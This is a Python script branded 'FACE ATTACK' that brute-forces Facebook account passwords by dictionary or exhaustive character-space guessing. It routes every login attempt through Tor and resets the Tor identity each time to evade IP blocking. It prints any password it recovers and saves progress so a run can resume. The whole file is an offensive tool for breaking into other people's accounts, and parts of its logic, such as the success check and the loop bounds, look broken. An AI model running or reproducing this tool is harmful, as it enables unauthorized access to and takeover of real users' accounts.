import os
import itertools
from mod.reqtor import TorRequest

def facebook(user, pw, pas):
    def login(session, email, password):
        
        '''
        Attempt to login to Facebook. Returns user ID, xs token and
        fb_dtsg token. All 3 are required to make requests to
        Facebook endpoints as a logged in user. Returns False if
        login failed.
        '''

        # Navigate to Facebook's homepage to load Facebook's cookies.
        response = session.get('https://m.facebook.com')
        
        # Attempt to login to Facebook
        response = session.post('https://m.facebook.com/login.php', data={
            'email': email,
            'pass': password
        }, allow_redirects=False)
        
        # If c_user cookie is present, login was successful
        r = str(response.cookies)
        if 'checkpoint=' in r:

            return True
        else:
            return False 
    print("[FACE] connecting requests to tor...")
    valid = False
    while not valid:
        try:
            session=TorRequest(password=pas)
            valid = True
        except Exception:
            print("[!] error in connecting to tor")
            print("[!] if this problem persistes u may have entered the wong password")
            print("[!] restaring tor...")
            os.system("service tor restart")
            print("[!] tor restarted, retrying login...")
    session.reset_identity()
    response = session.get('http://ipecho.net/plain').text
    print("[FACE] ip used in login ("+response+")")

#    session.headers.update({
#        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0'
#    })

    user_id= login(session, user, pw)
    print(user_id)
    if user_id:
        return True
    else:
        return False

def main():
    os.system("clear")
    banner = """
            ================================
             ____             _____    ____
            |  __|           /  ___|  |  __|
            | |__     /\    |  /      | |__
            |  __|   /__\   | |       |  __|
            | |     / __ \  |  \___   | |__
            |_|    /_/  \_\  \_____|  |____| 

            ==========[FACE ATTACK]=========

    """
    print(banner)
    usr = input("[ENTER] enter the username: ")
    print("[FACE] starting tor")
    pasd = input("[ENTER] enter unhashed password to accses tor: ")
    os.system("sudo /etc/init.d/tor restart")
    print("1) worlist")
    print("2) pybrute")
    cho = int(input("[ENTER] enter choice: "))

    if cho == 1:
        path = input("[ENTER] enter full path to password list: ")
        f = open(path,"r").readlines()
        count = 0
        mx = len(f)
        r = str(mx)
        for x in f:
            count += 1
            x = x.replace("\n","")
            print("[FACE] attempt ("+str(count)+"/"+r+")")
            chk = facebook(usr, x, pasd)
            if chk == True:
                os.system("clear")
                print(banner)
                print("[FACE] got the user name and password")
                print("USR: ", usr)
                print("PSWD: ", x)
                print("[FACE] got password after ("+str(count)+") attempts")
                input("[ENTER] hit enter to continue")
                break
            else:
                pass
    elif cho == 2:
        mx = 8

        run_til = 0
        n = 0

        name = "tools/social_tools/face/"+usr+".txt"

        try:
            f = open(name,"r")
            num = f.readline()[0]
            f.close()
            run_til = int(num)
            print("[FACE] getting to where left off...")
        except FileNotFoundError:
            f = open(name,"x")
            f.close()

        temp = 0

        try:
            while mx != 64:
                count = 0
                PASSWORD_LIST = itertools.product("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM", repeat=mx)

                for pas in PASSWORD_LIST:
                    n = n + 1
                    if temp == run_til:
                        pas = str(pas)
                        pas = pas.replace("')","")
                        pas = pas.replace("('","")
                        pas = pas.replace("'","")
                        pas = pas.replace(" ","")
                        pas = pas.replace(",","")
                        #print(pas)
                        u = str(pas)
                        count += 1
                        u = u.replace("\n","")
                        print("[FACE] attempt ("+str(count)+")")
                        print("[FACE] password ("+u+")")
                        chk = facebook(usr, u, pasd)
                        if chk == True:
                            os.system("clear")
                            print(banner)
                            print("[FACE] got the user name and password")
                            print("USR: ", usr)
                            print("PSWD: ", u)
                            print("[FACE] got password after ("+str(count)+") attempts")
                            input("[ENTER] hit enter to continue")
                            break
                        else:
                            pass
                    else:
                        temp = temp + 1
            mx = mx + 1
        except KeyboardInterrupt:
            f = open(name,"w")
            f.write(str(n))
            f.close()
    else:
        pass
    print("[!] done!")
